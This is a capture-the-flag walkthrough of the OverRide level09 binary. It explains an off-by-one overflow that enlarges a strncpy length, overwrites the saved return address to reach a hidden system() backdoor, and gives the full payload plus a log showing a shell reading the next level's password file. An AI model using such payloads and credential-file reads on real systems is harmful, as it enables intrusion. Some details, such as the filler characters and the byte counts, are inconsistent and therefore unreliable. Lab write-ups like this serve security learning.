# Level09 — Exploit Walkthrough

## 1. Program Behavior

When running the binary, the program asks for two inputs:

* A **username**
* A **message**

Both inputs are read with `fgets()` and stored inside a structure:

```c
typedef struct s_message {
    char text[140];     // buffer for the message
    char username[40];  // buffer for the username
    int len;            // initialized to 140
} t_message;
```

### Key points:

* `set_username()` → copies characters one by one into `username`. It actually copies **41 characters**, so there is a **1-byte overflow**.
* `set_msg()` → uses `strncpy(msg->text, buffer, msg->len)`. The size parameter (`msg->len`) is under our control because of the overflow.

---

## 2. The Vulnerability

* The integer `len` comes right after `username` in memory.
* Normally, `len = 0x0000008c (140)`.
* By overflowing `username` with 41 characters, we overwrite the **least significant byte of `len`**.
* For example, if we write `0xd4` as the 41st byte:

  * `len` changes from `0x0000008c` → `0x000000d4` (212).
* This means `strncpy()` will now copy **212 bytes** into a buffer of size 140, overflowing into saved registers.

This is the vulnerability we will exploit.

---

## 3. The Target: `secret_backdoor()`

Disassembly reveals a hidden function:

```asm
0x000055555555488c <secret_backdoor>:
   fgets(buf, 128, stdin)
   system(buf)
```

* `secret_backdoor()` reads a command from stdin and passes it to `system()`.
* This is a classic target for exploitation: if we redirect execution here, we can run any shell command.

---

## 4. Exploit Strategy

1. Use the off-by-one overflow in `set_username()` to overwrite `len` with a bigger value (`212`).
2. Provide a long message so that `strncpy()` will overwrite saved registers.
3. Overwrite the saved **RIP** with the address of `secret_backdoor()`.
4. Place the string `"/bin/sh"` right after, so it becomes the argument for `system()`.

---

## 5. Memory Layout

* `username[40]` → followed immediately by `len` (4 bytes).
* After `username`, the function continues into other saved values, eventually reaching the saved **RIP**.
* With `len = 212`, we copy **200 filler bytes + 8-byte RIP overwrite**.

The buffer overflow path looks like this:

```
[ 140 bytes text ]
[ 40 bytes username ]
[   4 bytes len  ] ← corrupted by username overflow
[ ... saved RIP ]
```

---

## 6. Building the Payload

### Step 1. Overwrite `len`

We write:

```
'A' * 40 + '\xd4' + '\n'
```

* 40 × `A` fill the username.
* `\xd4` overwrites `len` → 212.

### Step 2. Overflow into RIP

Now `strncpy()` will copy 212 bytes into 140:

* 200 × `A` (filler)
* Address of `secret_backdoor()` in **little-endian**
* String `"/bin/sh"`

### Step 3. Address of `secret_backdoor()`

From GDB:

```
0x000055555555488c
```

Little-endian form:

```
\x8c\x48\x55\x55\x55\x55\x00\x00
```

### Step 4. Final Payload

```bash
python -c "print 'B'*40 + '\xd4' + '\n' + 'B'*200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '/bin/sh'" > /tmp/exploit
```

---

## 7. Running the Exploit

```bash
level09@OverRide:~$ cat /tmp/exploit - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
>: Msg @Unix-Dude
>>: >: Msg sent!
/bin/sh
$ whoami
end
$ cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

---

## 8. Summary

* The binary has a hidden function `secret_backdoor()`.
* A 1-byte overflow in `set_username()` lets us corrupt `len`.
* This changes how many bytes `strncpy()` copies in `set_msg()`.
* By setting `len = 212`, we overwrite saved RIP.
* RIP is replaced with `secret_backdoor()`'s address.
* Finally, `/bin/sh` is executed, giving us a shell and access to the password.
